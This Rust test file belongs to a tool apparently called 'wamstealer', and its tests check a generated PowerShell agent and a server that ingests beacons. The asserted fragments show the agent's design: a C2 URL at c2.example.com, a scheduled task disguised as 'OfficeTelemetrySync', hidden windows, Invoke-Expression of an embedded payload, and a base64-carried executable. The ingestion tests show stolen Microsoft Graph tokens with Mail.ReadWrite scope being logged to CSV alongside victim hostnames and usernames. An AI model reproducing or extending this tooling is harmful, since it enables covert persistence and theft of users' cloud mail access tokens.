use wamstealer::beacon::Outcome;
use wamstealer_server::{ingest, ps1};
use base64::Engine;
use serde_json::json;

fn settings() -> ps1::AgentSettings {
    ps1::AgentSettings {
        server_url: "https://c2.example.com".into(),
        secret: "topsecret".into(),
        install_subdir: "Microsoft\\OfficeTelemetry".into(),
        task_name: "OfficeTelemetrySync".into(),
        exe_name: "offdiag.exe".into(),
        script_name: "agent.ps1".into(),
    }
}

fn token_from_payload(claims: &serde_json::Value) -> String {
    let encode = |bytes: &[u8]| base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(bytes);
    format!(
        "{}.{}.{}",
        encode(br#"{"alg":"HS256"}"#),
        encode(claims.to_string().as_bytes()),
        encode(b"signature")
    )
}

#[test]
fn agent_script_substitutes_every_value_and_embeds_the_agent() {
    let script = ps1::build_agent_script(&settings(), b"MZfakeexe");
    for fragment in [
        "$serverUrl = 'https://c2.example.com'",
        "$secret = 'topsecret'",
        "$taskName = 'OfficeTelemetrySync'",
        "$exePath = Join-Path $installDir 'offdiag.exe'",
        "'Microsoft\\OfficeTelemetry'",
        "'agent.ps1'",
        "New-ScheduledTaskPrincipal -UserId \"$env:USERDOMAIN\\$env:USERNAME\" -LogonType Interactive",
        "-WindowStyle Hidden",
        "& $exePath --server $serverUrl --secret $secret | Out-Null",
        "Invoke-Expression $payload",
        "[IO.File]::WriteAllText($scriptPath, $payload)",
    ] {
        assert!(script.contains(fragment), "missing: {fragment}");
    }
    for placeholder in [
        "__SERVER_URL__",
        "__SECRET__",
        "__INSTALL_SUBDIR__",
        "__TASK_NAME__",
        "__EXE_NAME__",
        "__SCRIPT_NAME__",
        "__AGENT_B64__",
        "__PAYLOAD__",
    ] {
        assert!(!script.contains(placeholder), "leftover: {placeholder}");
    }
    let encoded: Vec<_> = script
        .lines()
        .filter(|line| line.trim_start().starts_with("$agentB64 = "))
        .collect();
    assert_eq!(encoded.len(), 1, "the payload carries the agent once");
    let start = encoded[0].find("'").unwrap() + 1;
    let end = encoded[0].rfind("'").unwrap();
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(&encoded[0][start..end])
        .unwrap();
    assert_eq!(decoded, b"MZfakeexe");
}

#[test]
fn here_string_terminators_only_appear_in_the_wrapper() {
    let script = ps1::build_agent_script(&settings(), b"payload");
    let terminators = script
        .lines()
        .filter(|line| line.trim_end() == "'@")
        .count();
    assert_eq!(terminators, 1, "only the wrapper's here-string closer");
}

#[test]
fn apostrophes_in_values_are_escaped_powershell_style() {
    let settings = ps1::AgentSettings {
        secret: "o'brien".into(),
        ..settings()
    };
    let script = ps1::build_agent_script(&settings, b"x");
    assert!(script.contains("$secret = 'o''brien'"));
    assert!(!script.contains("'o'brien'"));
}

#[test]
fn beacons_become_csv_rows_and_junk_tokens_are_rejected() {
    use chrono::TimeZone;
    let now = chrono::Utc.with_ymd_and_hms(2026, 10, 18, 12, 0, 0).unwrap();
    let valid_token = token_from_payload(&json!({
        "preferred_username": "user@example.com",
        "tid": "tenant",
        "scp": "Mail.ReadWrite",
        "exp": 1893456000
    }));
    let beacon = wamstealer::beacon::Beacon {
        agent: "wamstealer/1.1.0".into(),
        hostname: "WORKSTATION".into(),
        username: "alice".into(),
        client_id: "client-id".into(),
        scope: "https://graph.microsoft.com/.default".into(),
        authority: "common".into(),
        results: vec![
            Outcome::ok(Some("fallback@example.com".into()), Some("acc".into()), valid_token.clone()),
            Outcome::error(None, None, json!({"status": "token_error"})),
            Outcome::ok(None, None, "definitely.not.a.jwt".into()),
        ],
    };
    let processed = ingest::process(&beacon, now);
    assert_eq!(processed.rows.len(), 1);
    assert_eq!(processed.errors.len(), 1);
    assert_eq!(processed.rejected, 1);
    let row = &processed.rows[0];
    assert_eq!(row.timestamp_utc, "2026-10-18T12:00:00Z");
    assert_eq!(row.hostname, "WORKSTATION");
    assert_eq!(row.host_username, "alice");
    assert_eq!(row.upn, "user@example.com");
    assert_eq!(row.tenant_id, "tenant");
    assert_eq!(row.client_id, "client-id");
    assert_eq!(row.scope, "Mail.ReadWrite");
    assert_eq!(row.expires_utc, "2030-01-01T00:00:00Z");
    assert_eq!(row.token, valid_token);
}

#[test]
fn csv_writes_the_header_once_and_appends() {
    let now = chrono::Utc::now();
    let row = |token: &str| ingest::CapturedRow {
        timestamp_utc: "2026-10-18T12:00:00Z".into(),
        hostname: "H".into(),
        host_username: "u".into(),
        upn: "user@example.com".into(),
        tenant_id: "t".into(),
        client_id: "c".into(),
        scope: "s".into(),
        expires_utc: String::new(),
        token: token.into(),
    };
    let mut path = std::env::temp_dir();
    path.push(format!(
        "wamstealer-csv-test-{}-{}",
        std::process::id(),
        now.timestamp_nanos_opt().unwrap()
    ));
    std::fs::write(&path, b"").unwrap();
    ingest::append_csv(&path, &[row("a"), row("b")]).unwrap();
    ingest::append_csv(&path, &[row("c")]).unwrap();
    let contents = std::fs::read_to_string(&path).unwrap();
    let mut lines = contents.lines();
    assert!(lines.next().unwrap().starts_with("timestamp_utc,"));
    assert_eq!(lines.count(), 3);
    std::fs::remove_file(&path).unwrap();
}
